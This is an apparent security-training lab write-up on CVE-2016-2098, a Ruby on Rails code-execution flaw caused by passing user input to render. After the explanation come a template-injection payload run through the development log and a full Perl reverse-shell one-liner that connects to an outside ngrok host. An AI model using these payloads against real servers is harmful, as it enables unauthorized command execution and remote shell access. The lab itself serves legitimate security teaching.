
# CVE-2016-2098

* This exercise covers a remote code execution vulnerability in Ruby-on-Rails when using render on user-supplied data

## Introduction

* This course details the exploitation of the vulnerability `CVE-2016-2098`. This vulnerability is caused by calling the method `render` on user-supplied data. This issue can be used to gain code execution.

## The issue

* This issue comes from the usage of the `render` method on user-supplied data. The following code illustrates the problem:
```ruby
class TestController < ApplicationController
  def show
    render params[:id]
  end
end
```
* The method `render` is usually used to render a page from a template like in the following code:
```ruby
class TestController < ApplicationController
  def show
    render 'show'
  end
end
```

* The `render` method also allows developers to render plain text (`plaintext`) and even `inline code` (`inline`). If you want to jump to exploitation on your own, you can read more about the `render` method [here](https://guides.rubyonrails.org/layouts_and_rendering.html). Then you will need to look at ways to gain code execution using the first example.

## Exploitation

* If you carefully read the [documentation](https://guides.rubyonrails.org/layouts_and_rendering.html), you can see that the `render` method accepts `inline` code. Instead of sending a simple parameter `id=test`, you can build your request to send a hash: `id[inline]=RUBYTEMPLATE`. To gain code execution, you just need to find the right value for `RUBYTEMPLATE` to exec commands. Here you will need to be extra careful with the encoding to get it to work.

## Conclusion

* This exercise showed you how to exploit CVE-2016-2098 to gain code execution on a server. It's always important to make sure that you check for Array and Hash format in parameters when testing a web application as this may allow you to trigger unexpected behavior.


* You can access this exercise using the following URL: http://ptl-811be015-549ac544.libcurl.so/ 


* You can pass __<%= `ls` %>__ as id parameter (this parameter is logged into a __development.log__ file ) after url encoding and got to  ` http://ptl-811be015-549ac544.libcurl.so/pages?id=.%2flog%2fdevelopment.log ` where renders the file as template and run the command __ls__ as part of template rendering.


* You can get a reverse shell with following payload
```
<%= `perl -e 'use Socket;$i="0.tcp.ngrok.io";$p=14051;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
`%>
```

* Don't forget to url encode.
